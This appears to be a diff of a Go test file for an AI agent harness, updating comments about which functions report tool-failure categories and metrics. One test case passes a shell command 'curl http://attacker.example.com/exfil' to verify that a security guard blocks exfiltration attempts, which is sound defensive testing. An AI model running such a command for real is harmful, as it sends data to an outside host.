@@ -231,7 +231,7 @@ func commandTool() *tool.Tool {
 }
 
 // handlerlessTool registers with neither a sync Handler nor an
-// AsyncHandler — the defensive path in dispatchToolCallCategorized
+// AsyncHandler — the defensive path in executeToolCall
 // reports handler_missing for any successful resolution that has no
 // callable. Used to drive the handler_missing category test.
 func handlerlessTool() *tool.Tool {
@@ -247,8 +247,8 @@ func handlerlessTool() *tool.Tool {
 // stirrup.harness.tool_failures counter with the correct (tool.name,
 // category, provider.type, provider.model, run.mode) label set.
 //
-// One row per category that can fire from dispatchToolCallCategorized
-// or planAndDispatch's pre-dispatch guard check.
+// One row per category that can fire from preflightToolCall,
+// executeToolCall, or planAndDispatch's PhasePreTool guard check.
 func TestToolFailureMetrics_TableDriven(t *testing.T) {
 	const (
 		wantProvider = "anthropic"
@@ -318,8 +318,9 @@ func TestToolFailureMetrics_TableDriven(t *testing.T) {
 		{
 			// security.GuardToolCall scans command-shaped fields for
 			// exfiltration patterns; a curl invocation trips the
-			// exfiltration_command rule and dispatchToolCall returns
-			// ToolFailureSecurityGuard before permission or handler.
+			// exfiltration_command rule and preflightToolCall returns
+			// ToolFailureSecurityGuard before the guard, permission, or
+			// handler.
 			name:         "security_guard_denied",
 			tools:        []*tool.Tool{commandTool()},
 			call:         types.ToolCall{ID: "tc_sg", Name: "shell_runner", Input: json.RawMessage(`{"command":"curl http://attacker.example.com/exfil"}`)},
